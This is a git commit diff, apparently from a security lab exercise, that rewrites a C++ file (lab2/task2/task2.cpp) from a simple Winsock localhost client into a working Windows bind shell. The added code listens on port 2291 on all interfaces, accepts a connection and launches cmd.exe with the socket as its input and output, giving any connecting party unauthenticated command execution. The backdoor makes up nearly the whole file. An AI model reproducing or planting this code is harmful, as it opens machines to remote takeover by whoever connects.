d2200fa8bed2126965581d86f32d430e3a71bf3e
dedkuzmich <91969553+dedkuzmich@users.noreply.github.com>
2024-03-18 02:42:02 +0200

    bind shell

--- lab2/task2/task2.cpp
+++ lab2/task2/task2.cpp
@@ -1,81 +1,38 @@
 #include <winsock2.h>
-#include <ws2tcpip.h>
 #include <iostream>
-
-#pragma comment(lib, "ws2_32.lib")
 
 using namespace std;
 
-int main() 
+#pragma comment(lib,"ws2_32.lib")
+
+int main()
 {
-    LPCSTR ipv4 = "127.0.0.1";
-    LPCSTR port = "2291";
+	SOCKET s, cs;
+	WSADATA ws;
+	struct sockaddr_in server, client;
+	STARTUPINFOA si;
+	PROCESS_INFORMATION pi;
+	int port = 2291;
 
-    WSADATA wsaData;
-    SOCKET ConnectSocket = INVALID_SOCKET;
-    struct addrinfo* result = NULL, * ptr = NULL, hints;
+	WSAStartup(MAKEWORD(2, 2), &ws);
 
-    // Initialize Winsock
-    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
-    if (iResult != 0) 
-    {
-        cout << "WSAStartup failed: " << iResult << endl;
-        return 1;
-    }
+	s = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
 
-    ZeroMemory(&hints, sizeof(hints));
-    hints.ai_family = AF_UNSPEC;
-    hints.ai_socktype = SOCK_STREAM;
-    hints.ai_protocol = IPPROTO_TCP;
+	server.sin_family = AF_INET;
+	server.sin_port = htons(port);
+	server.sin_addr.s_addr = INADDR_ANY;
 
-    // Resolve the server address and port
-    iResult = getaddrinfo(ipv4, port, &hints, &result);
-    if (iResult != 0) 
-    {
-        cout << "getaddrinfo failed: " << iResult << endl;
-        WSACleanup();
-        return 1;
-    }
+	bind(s, (struct sockaddr*)&server, sizeof(server));
+	listen(s, SOMAXCONN);
+	cs = WSAAccept(s, NULL, NULL, NULL, 0);
 
-    // Attempt to connect to the first address returned by the call to getaddrinfo
-    ptr = result;
-    ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
+	memset(&si, 0, sizeof(si));
+	si.cb = sizeof(si);
+	si.dwFlags = STARTF_USESTDHANDLES;
+	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)cs;
 
-    // Check for errors to ensure that the socket is a valid socket
-    if (ConnectSocket == INVALID_SOCKET) 
-    {
-        cout << "Error at socket: " << WSAGetLastError() << endl;
-        freeaddrinfo(result);
-        WSACleanup();
-        return 1;
-    }
+	const string path = "cmd.exe";
+	CreateProcessA(NULL, (LPSTR)path.c_str(), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
 
-    // Connect to server.
-    iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
-    if (iResult == SOCKET_ERROR) 
-    {
-        closesocket(ConnectSocket);
-        ConnectSocket = INVALID_SOCKET;
-    }
-
-    freeaddrinfo(result);
-
-    if (ConnectSocket == INVALID_SOCKET) 
-    {
-        cout << "Unable to connect to server!" << endl;
-        WSACleanup();
-        return 1;
-    }
-
-    // Connection successful
-    cout << "Successfully connected to localhost on port " << port << endl;
-
-    system("pause");
-
-
-    // cleanup
-    closesocket(ConnectSocket);
-    WSACleanup();
-
-    return 0;
+	return 0;
 }
